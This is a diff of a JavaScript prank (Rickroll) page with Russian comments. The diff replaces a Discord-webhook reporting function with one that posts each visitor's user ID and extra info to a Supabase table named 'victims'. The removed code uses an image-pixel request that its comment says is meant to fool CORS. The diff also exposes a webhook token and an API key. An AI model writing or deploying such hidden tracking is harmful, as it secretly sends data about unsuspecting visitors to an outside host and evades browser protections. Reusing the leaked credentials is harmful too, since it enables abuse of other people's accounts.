@@ -63,23 +63,31 @@
         }
 
         // 2. ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
-function sendToWebhook() {
-    const webhookUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
-    
-    // Формируем текст сообщения
-    const content = `🚨 Пользователь попался! | Жертва: ID ${userId || "unknown"} | Код: ${extraInfo || "none"}`;
+async function sendToWebhook() {
+    const SB_URL = "https://pijmvaufzvoqbsvabglv.supabase.co/rest/v1/victims";
+    const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBpam12YXVmenZvcWJzdmFiZ2x2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU3NDE5ODksImV4cCI6MjA5MTMxNzk4OX0.GLq3pyQhDwJOEaiIpNu6zef_dm9034cW47gDY10y4Yc";
 
-    // Дискорд позволяет отправлять сообщение через GET-параметр в некоторых случаях,
-    // но самый верный способ обмануть CORS - это заставить браузер думать, что мы грузим картинку.
-    const img = new Image();
-    
-    // Мы отправляем данные прямо в URL. 
-    // ВАЖНО: Дискорд может не принять это как сообщение, но это пробьет CORS на 100%.
-    img.src = `${webhookUrl}?content=${encodeURIComponent(content)}&wait=true`;
+    const data = {
+        user_id: userId || "unknown",
+        extra: extraInfo || "none"
+    };
 
-    console.log("Попытка пробития через Image Pixel...");
+    try {
+        await fetch(SB_URL, {
+            method: 'POST',
+            headers: {
+                'apikey': SB_KEY,
+                'Authorization': `Bearer ${SB_KEY}`,
+                'Content-Type': 'application/json',
+                'Prefer': 'return=minimal'
+            },
+            body: JSON.stringify(data)
+        });
+        console.log("Данные в базе!");
+    } catch (e) {
+        console.error("Ошибка записи:", e);
+    }
 }
-
         function startRickRoll() {
             if (!apiReady || isRolling) return;
             isRolling = true;
